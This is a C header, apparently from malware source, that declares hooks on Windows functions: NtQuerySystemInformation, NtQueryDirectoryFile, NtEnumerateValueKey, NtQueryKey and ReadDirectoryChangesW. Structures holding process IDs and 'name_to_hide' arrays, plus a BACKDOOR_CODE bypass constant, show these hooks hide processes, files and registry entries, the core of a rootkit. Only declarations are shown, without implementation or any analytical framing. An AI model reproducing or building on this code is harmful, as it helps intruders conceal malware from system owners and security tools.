#define BACKDOOR_CODE 0xABADC0DE // Usato per far richiamare le funzioni senza hiding
#define HIDE_NAME_COUNT 3

typedef struct {
	COMMONDATA;
	DWORD pid;
	DWORD ppid;
} H_NtQuerySystemInformationStruct;
PROTOTYPE_HOOK(NTSTATUS, H_NtQuerySystemInformation, SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, LONG SystemInformationLength, PULONG ReturnLength);

typedef struct {
	COMMONDATA;
	WCHAR name_to_hide[HIDE_NAME_COUNT][MAX_RAND_NAME];
} H_NtQueryDirectoryFileStruct;
PROTOTYPE_HOOK(NTSTATUS, H_NtQueryDirectoryFile, HANDLE FileHandle, HANDLE Event, PVOID ApcRoutinte, PVOID ApcContext, PVOID IoStausBlock, BYTE *FileInformation, ULONG FileInformationLength, LONG FileInformationClass, BOOL ReturnSingleEntry, PVOID FileMask, BOOL RestartScan);

typedef struct {
	COMMONDATA;
	WCHAR name_to_hide[MAX_RAND_NAME];
} H_NtEnumerateValueKeyStruct;
PROTOTYPE_HOOK(NTSTATUS, H_NtEnumerateValueKey, HANDLE KeyHandle, ULONG Index, LONG KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);

typedef struct {
	COMMONDATA;
	WCHAR name_to_hide[MAX_RAND_NAME];
	H_NtEnumerateValueKey_t pNtEnumerateValueKey;
} H_NtQueryKeyStruct;
PROTOTYPE_HOOK(NTSTATUS, H_NtQueryKey, HANDLE KeyHandle, LONG KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG Resultlength);

typedef struct {
	COMMONDATA;
} H_ReadDirectoryChangesWStruct;
PROTOTYPE_HOOK(BOOL, H_ReadDirectoryChangesW, HANDLE hDirectory, LPVOID lpBuffer, DWORD nBufferLength, BOOL bWatchSubtree, DWORD dwNotifyFilter, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped, LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
